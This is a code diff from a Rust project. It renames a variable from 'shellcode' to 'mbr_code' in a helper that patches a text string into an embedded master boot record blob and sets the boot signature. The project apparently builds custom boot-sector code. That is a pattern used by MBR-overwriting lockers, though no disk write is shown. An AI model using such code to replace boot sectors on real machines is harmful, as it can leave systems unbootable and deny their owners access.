@@ -49,25 +49,25 @@ pub const MBRCODE: &[u8] = &[
     0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xaa
 ];
 
-pub fn modify_string(shellcode: &mut Vec<u8>, old_str: &str, new_str: &str) -> bool {
-    if let Some(pos) = shellcode.windows(old_str.len()).position(|window| window == old_str.as_bytes()) {
+pub fn modify_string(mbr_code: &mut Vec<u8>, old_str: &str, new_str: &str) -> bool {
+    if let Some(pos) = mbr_code.windows(old_str.len()).position(|window| window == old_str.as_bytes()) {
         let start = pos;
         let end = start + old_str.len();
 
         if new_str.len() > old_str.len() {
-            shellcode.splice(start..end, new_str.as_bytes().iter().cloned());
+            mbr_code.splice(start..end, new_str.as_bytes().iter().cloned());
         } else {
-            shellcode[start..start + new_str.len()].copy_from_slice(new_str.as_bytes());
+            mbr_code[start..start + new_str.len()].copy_from_slice(new_str.as_bytes());
             for i in start + new_str.len()..end {
-                shellcode[i] = 0;
+                mbr_code[i] = 0;
             }
         }
 
-        if shellcode.len() < 512 {
-            shellcode.resize(512, 0);
+        if mbr_code.len() < 512 {
+            mbr_code.resize(512, 0);
         }
-        shellcode[510] = 0x55;
-        shellcode[511] = 0xAA;
+        mbr_code[510] = 0x55;
+        mbr_code[511] = 0xAA;
 
         return true;
     }
